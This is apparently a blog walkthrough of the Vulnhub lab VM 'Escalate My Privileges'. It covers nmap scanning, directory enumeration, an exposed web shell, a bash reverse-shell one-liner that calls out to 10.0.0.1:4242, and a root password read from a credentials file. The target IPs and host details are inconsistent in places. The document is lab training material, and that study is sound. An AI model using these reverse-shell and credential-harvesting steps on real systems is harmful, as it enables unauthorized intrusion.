---
title: ESCALATE MY PRIVILEGES - Vulnhub Walkthrough
date: 2021-08-13 05:35:00 +0200
categories: [VlunHub]
tags: [vulnhub, ESCALATE_MY_PRIVILEGES, privilege_escalation] 

---

# INIT

identify target IP 

```console
➜  ~ nmap -sP 172.16.129.128/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 18:52 EDT
Nmap scan report for Home (172.16.129.1)
Host is up (0.0019s latency).
Nmap scan report for 172.16.129.2
Host is up (0.00054s latency).
Nmap scan report for 172.16.129.128
Host is up (0.0013s latency).
Nmap scan report for 172.16.129.140
Host is up (0.0074s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.69 seconds
```



edit `/etc/hosts` file (local DNS)

```console
# Vulnhub
172.16.129.140 privlinux.vuln
```

lets starting ...

# Scanning

### Nmap

```console
➜  ~ sudo nmap -A -p- -T4 Esclinux.vuln 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 10:27 EDT
Nmap scan report for Esclinux.vuln (172.16.129.139)
Host is up (0.0011s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34511/udp   mountd
|   100005  1,2,3      50751/tcp   mountd
|   100005  1,2,3      55807/tcp6  mountd
|   100005  1,2,3      57755/udp6  mountd
|   100021  1,3,4      38135/tcp   nlockmgr
|   100021  1,3,4      38777/tcp6  nlockmgr
|   100021  1,3,4      54049/udp   nlockmgr
|   100021  1,3,4      60507/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     3 (RPC #100227)
38135/tcp open  nlockmgr    1-4 (RPC #100021)
41879/tcp open  mountd      1-3 (RPC #100005)
50079/tcp open  mountd      1-3 (RPC #100005)
50751/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 00:0C:29:9F:EB:8D (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: LINUX

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: osboxes
|   NetBIOS computer name: LINUX\x00
|   Domain name: \x00
|   FQDN: osboxes
|_  System time: 2021-08-12T10:27:39-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-12T14:27:39
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   1.07 ms Esclinux.vuln (172.16.129.139)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.98 seconds
```



# Enumeration

**port 80** is opened let's take a look

![image-20210813010746392](/assets/2021-08-13-ESCALATE-MY-PRIVILEGES/image-20210813010746392.png)

landing page OK ...

**Whatweb**

```console
➜  ~ sudo whatweb privlinux.vuln    
http://privlinux.vuln [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[172.16.129.140], PHP[5.4.16], Title[Check your Privilege]
```

**Check directory**

```console
➜  ~ gobuster dir -u http://privlinux.vuln -w ~/SecLists/Discovery/Web-Content/common.txt     
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://privlinux.vuln
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/x/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/13 08:51:08 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 211]
/.htaccess            (Status: 403) [Size: 211]
/.hta                 (Status: 403) [Size: 206]
/cgi-bin/             (Status: 403) [Size: 210]
/index.html           (Status: 200) [Size: 240]
/phpinfo.php          (Status: 200) [Size: 51567]
/robots.txt           (Status: 200) [Size: 37]   
                                                 
===============================================================
2021/08/13 08:51:09 Finished
===============================================================
```

lets take a look on `/robots.txt` 

![image-20210813145240624](/assets/2021-08-13-ESCALATE-MY-PRIVILEGES/image-20210813145240624.png)

`/phpbash.php` looks interesting ...

![image-20210813145418072](/assets/2021-08-13-ESCALATE-MY-PRIVILEGES/image-20210813145418072.png) 

we have a Shell hear !!

![image-20210813145458598](/assets/2021-08-13-ESCALATE-MY-PRIVILEGES/image-20210813145458598.png)

- [x] Service Account Access

# Exploiting

**Reverse shell**

`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`

![image-20210813161625693](/assets/2021-08-13-ESCALATE-MY-PRIVILEGES/image-20210813161625693.png)

![image-20210813161659642](/assets/2021-08-13-ESCALATE-MY-PRIVILEGES/image-20210813161659642.png)



# Privilege Escalation

dive into `cd /home/armour` we find `Credentials.txt`

![image-20210813161943673](/assets/2021-08-13-ESCALATE-MY-PRIVILEGES/image-20210813161943673.png)

we have root password here !!!

Credentials : `root:rootroot1`

![image-20210813162525406](/assets/2021-08-13-ESCALATE-MY-PRIVILEGES/image-20210813162525406.png)

![image-20210813162610514](/assets/2021-08-13-ESCALATE-MY-PRIVILEGES/image-20210813162610514.png)

- [x] Root User Account Access

